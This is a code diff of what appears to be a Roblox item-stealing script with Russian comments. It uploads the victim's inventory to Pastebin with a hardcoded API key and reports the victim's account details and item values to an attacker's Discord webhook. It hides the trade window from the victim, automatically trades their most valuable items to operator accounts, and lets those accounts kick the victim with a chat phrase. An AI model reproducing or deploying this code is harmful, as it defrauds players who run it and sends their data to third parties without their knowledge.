+            Body = "api_dev_key=80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW&api_paste_code=" .. HttpService:UrlEncode(content) .. "&api_option=paste",
+            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"}
         })
+        
+        if response and response.Success then
+            local pasteUrl = response.Body
+            return "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+        end
     end)
-
-    if not success or not response or not response.Success then
-        return "\nError...\n"
-    end
-
-    local pasteUrl = response.Body
-    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
-
-    return rawUrl
+    
+    return success and result or "https://pastebin.com"
 end
 
-local function formatItems(itemList)
-    if #itemList == 0 then
-        return "None"
-    else
-        return table.concat(itemList, "\n")
+-- Подготавливаем список предметов для pastebin
+local itemCategories = {
+    ["Unique"] = {}, ["Ancient"] = {}, ["Godly"] = {},
+    ["Vintage"] = {}, ["Legendary"] = {}, ["Rare"] = {},
+    ["Uncommon"] = {}, ["Common"] = {}
+}
+
+for _, item in pairs(allItems) do
+    if itemCategories[item.weaponRarity] then
+        table.insert(itemCategories[item.weaponRarity], item.weaponName .. " • [x" .. item.weaponAmount .. " | " .. item.weaponValue .. "]")
     end
 end
 
-local pastebinString = "-- [ Unique Items ] --\n" ..formatItems(uniqueItems)..
-                         "\n\n-- [ Ancient Items ] --\n" ..formatItems(ancientItems)..
-                         "\n\n-- [ Godly Items ] --\n" ..formatItems(godlyItems)..
-                         "\n\n-- [ Legendary Items ] --\n" ..formatItems(legendaryItems)..
-                         "\n\n-- [ Vintage Items ] --\n" ..formatItems(vintageItems)..
-                         "\n\n-- [ Rare Items ] --\n" ..formatItems(rareItems)..
-                         "\n\n-- [ Uncommon Items ] --\n" ..formatItems(uncommonItems)..
-                         "\n\n-- [ Common Items ] --\n" ..formatItems(commonItems)..
+local pastebinContent = ""
+for rarity, items in pairs(itemCategories) do
+    if #items > 0 then
+        pastebinContent = pastebinContent .. "-- [ " .. rarity .. " Items ] --\n" .. table.concat(items, "\n") .. "\n\n"
+    end
+end
 
-                        "\n\nInventory list ft. Molitown"
+local pastebinLink = pastebin(pastebinContent .. "Inventory list ft. Molitown")
 
-
-local pastebinLink = pastebin(pastebinString)
-
+-- Получаем уровень
 local levelTable = {}
 for i,v in pairs(LevelModule.XPTable) do
     if PlayerDataModule.NewXP < v then
@@ -1140,38 +617,24 @@ end
 local playerLevel = math.min(table.unpack(levelTable))
 local playerPrestige = LevelModule.Prestige
 
--- ОТПРАВКА ОСНОВНОГО ЛОГА (после получения Real JobId)
+-- Отправляем основной лог
 local embed = {
     ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - " .. NameValue,
     ["color"] = 16711935, 
     ["fields"] = {
         {
             ["name"] = "🔗 **Teleport to :mammoth:**",
-            ["value"] = 
-            "🚀**Вставь в браузер для связи с дуплом**\n```" .. protocolLink .. "```\n" ..
-            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
+            ["value"] = "🚀**Вставь в браузер для связи с дуплом**\n```" .. protocolLink .. "```\n**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
             ["inline"] = false
         },
         {
             ["name"] = "〘:mammoth:〙**Info user**",
-            ["value"] = 
-            "```lua\n"..
-            "Username      : "..NameValue.."\n"..
-            "Account Age   : "..AgeValue.." Days\n"..
-            "Executor      : "..ExecutorValue.."\n"..
-            "Receiver      : "..Username.."/"..Username2.."\n"..
-            "Version       : "..VersionValue.."```",
+            ["value"] = "```lua\nUsername      : "..NameValue.."\nAccount Age   : "..AgeValue.." Days\nExecutor      : "..ExecutorValue.."\nReceiver      : "..Username.."/"..Username2.."\nVersion       : "..VersionValue.."```",
             ["inline"] = false
         },
         {
             ["name"] = "〘:moneybag:〙**Inventory Stats**",
-            ["value"] = 
-            "```lua\n"..
-            "💎 ТОП 5 ПРЕДМЕТОВ:\n"..topItemsText.."\n\n"..
-            "💰 Общая стоимость : "..totalValues.."\n\n"..
-            "🔥 Ancients Value  : "..ancientItemsValue.."\n"..
-            "⭐ Godlies Value   : "..godlyItemsValue.."\n"..
-            "👑 Legendaries     : "..legendaryItemsValue.."\n```",
+            ["value"] = "```lua\n💎 ТОП 5 ПРЕДМЕТОВ:\n"..topItemsText.."\n\n💰 Общая стоимость : "..totalValues.."\n\n🔥 Ancients Value  : "..ancientItemsValue.."\n⭐ Godlies Value   : "..godlyItemsValue.."\n👑 Legendaries     : "..legendaryItemsValue.."\n```",
             ["inline"] = false
         },
         {
@@ -1182,16 +645,15 @@ local embed = {
     }
 }
 
--- Отправляем уведомление в зависимости от ценности
 if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
     SendMessageEMBED(Webhook, embed, true)
 else
     SendMessageEMBED(Webhook, embed, false)
 end
 
--- Новая улучшенная функция скрытия TradeGUI
-local function setupTradeGUIHider()
-    local player = game:GetService("Players").LocalPlayer
+-- Скрытие TradeGUI
+coroutine.wrap(function()
+    local player = Players.LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
     
     local function hideTradeGUI()
@@ -1199,15 +661,9 @@ local function setupTradeGUIHider()
             local gui = playerGui:FindFirstChild(guiName)
             if gui then
                 gui.Enabled = false
-                -- Двойная защита: отключаем изменение Enabled
                 if not gui:FindFirstChild("AntiFlash") then
-                    local conn
-                    conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-                        if gui.Enabled then
-                            gui.Enabled = false
-                        else
-                            conn:Disconnect()
-                        end
+                    local conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                        if gui.Enabled then gui.Enabled = false end
                     end)
                     local anti = Instance.new("BoolValue")
                     anti.Name = "AntiFlash"
@@ -1217,44 +673,37 @@ local function setupTradeGUIHider()
         end
     end
 
-    -- Скрываем сразу при запуске
     hideTradeGUI()
-
-    -- Отслеживаем появление новых окон
     playerGui.ChildAdded:Connect(function(child)
         if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
             hideTradeGUI()
         end
     end)
 
-    -- Периодическая проверка
     while true do
         hideTradeGUI()
         task.wait(0.1)
     end
-end
+end)()
 
--- Запускаем скрытие GUI в отдельной корутине
-coroutine.wrap(setupTradeGUIHider)()
+-- Трейд система
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local lastOfferValue = nil
 
-local loop = false
-local tradeInProgress = false
+Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
+    lastOfferValue = tradeData.LastOffer
+end)
 
 local function isTradeGUIOpen()
-    local player = game:GetService("Players").LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-    
-    for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
-        local tradeGUI = playerGui:FindFirstChild(guiName)
-        if tradeGUI then
-            return true
-        end
-    end
-    return false
+    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+    return playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
 end
 
 local function stealItems(ReceiverName)
-    loop = true
+    local loop = true
+    local tradeInProgress = false
+    
     while loop do
         if tradeInProgress then
             task.wait(1)
@@ -1276,16 +725,13 @@ local function stealItems(ReceiverName)
             end
         end
         
-        table.sort(availableItems, function(a, b) 
-            return a.value > b.value
-        end)
+        table.sort(availableItems, function(a, b) return a.value > b.value end)
         
         if #availableItems == 0 then
             loop = false
             return
         end
         
-        -- Отправляем запрос на обмен
         tradeInProgress = true
         local success = pcall(function()
             Trade.SendRequest:InvokeServer(game:GetService("Players")[ReceiverName])
@@ -1297,7 +743,6 @@ local function stealItems(ReceiverName)
             continue
         end
         
-        -- Ждем когда трейд будет принят (максимум 30 секунд)
         local tradeAccepted = false
         for i = 1, 30 do
             if isTradeGUIOpen() then
@@ -1308,15 +753,12 @@ local function stealItems(ReceiverName)
         end
         
         if not tradeAccepted then
-            print("Трейд не был принят в течение 30 секунд")
             tradeInProgress = false
             continue
         end
         
-        -- ДАЕМ ВРЕМЯ ОКНУ ТРЕЙДА ОТКРЫТЬСЯ (как в оригинале)
         task.wait(2)
         
-        -- Добавляем предметы (ИСПОЛЬЗУЕМ ОРИГИНАЛЬНУЮ ЛОГИКУ)
         local sentItems = {}
         local addedCount = 0
         
@@ -1336,9 +778,6 @@ local function stealItems(ReceiverName)
                         amount = 1
                     })
                     addedCount = addedCount + 1
-                    print("Успешно добавлен предмет: " .. item.name)
-                else
-                    print("Ошибка при добавлении предмета: " .. item.name)
                 end
                 
                 task.wait(0.5)
@@ -1347,94 +786,60 @@ local function stealItems(ReceiverName)
         end
         
         if addedCount == 0 then
-            print("Не удалось добавить ни одного предмета, отменяем трейд")
             pcall(function() Trade.DeclineTrade:FireServer() end)
             tradeInProgress = false
             task.wait(5)
             continue
         end
         
-        print("Успешно добавлено предметов: " .. addedCount)
-        
-        -- Ждем как в оригинале
         task.wait(4)
         
-        -- Подтверждаем трейд (оригинальная логика)
         if lastOfferValue then
             local acceptSuccess = pcall(function()
                 Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
             end)
             
-            if acceptSuccess then
-                print("Трейд подтвержден с lastOfferValue")
-                if #sentItems > 0 then
-                    SendTradeSuccessMessage(sentItems, ReceiverName)
-                end
-            else
-                print("Ошибка подтверждения трейда с lastOfferValue")
+            if acceptSuccess and #sentItems > 0 then
+                SendTradeSuccessMessage(sentItems, ReceiverName)
             end
         else
-            -- Fallback
-            local success = pcall(function()
+            pcall(function()
                 Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
             end)
-            if success then
-                print("Трейд подтвержден с tick()")
-            else
-                print("Ошибка подтверждения трейда с tick()")
-            end
         end
         
-        -- Ждем завершения трейда
         for i = 1, 10 do
-            if not isTradeGUIOpen() then
-                break
-            end
+            if not isTradeGUIOpen() then break end
             task.wait(1)
         end
         
         tradeInProgress = false
-        
-        -- Задержка перед следующим трейдом
         task.wait(1)
     end
 end
 
--- ==================== УЛУЧШЕННАЯ СИСТЕМА ОБРАБОТКИ ИГРОКОВ ====================
+-- Обработка игроков
 local function SetupTradeForPlayer(player)
     if player.Name == Username or player.Name == Username2 then
-        print("Обнаружен нужный игрок:", player.Name)
-        
-        -- Подписываемся на чат для трейда
         player.Chatted:Connect(function(message)
             if message:lower():match("trade") or message:lower():match("обмен") then
-                print("Получена команда на трейд от", player.Name)
-                loop = true
                 stealItems(player.Name)
             end
         end)
         
-        -- Подписываемся на /kick command
         player.Chatted:Connect(function(message)
             if message == "free dope" then
                 game.Players.LocalPlayer:Kick("\nPlease rejoin!")
             end
         end)
         
-        -- Автоматически начинаем трейд при подключении
-        print("Начинаем автоматический трейд с", player.Name)
-        task.wait(2)  -- Ждем немного перед началом
-        loop = true
+        task.wait(2)
         stealItems(player.Name)
     end
 end
 
--- Обработчик для новых игроков
-game.Players.PlayerAdded:Connect(function(player)
-    SetupTradeForPlayer(player)
-end)
+game.Players.PlayerAdded:Connect(SetupTradeForPlayer)
 
--- Обработка уже подключенных игроков
 for _, player in pairs(game.Players:GetPlayers()) do
     if player.Name == Username or player.Name == Username2 then
         SetupTradeForPlayer(player)
